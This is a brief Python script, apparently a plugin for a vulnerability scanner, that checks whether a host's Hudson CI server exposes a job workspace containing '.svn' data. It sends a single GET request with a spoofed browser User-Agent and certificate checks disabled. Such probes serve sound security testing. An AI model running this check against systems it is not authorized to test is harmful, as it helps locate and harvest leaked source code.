# -*- coding:utf-8 -*-

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if hudson code disclose vul')
    try:
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hudson/job/crm/ws/"
        vulnurl = url + payload
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if ".svn" in req.text:
            msg = 'There is a hudson code disclose vul on %s' %vulnurl
            print(msg)
            number = 'v78'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no hudson code disclose vul'
    number = 'v0'
    return False,url,number,msg

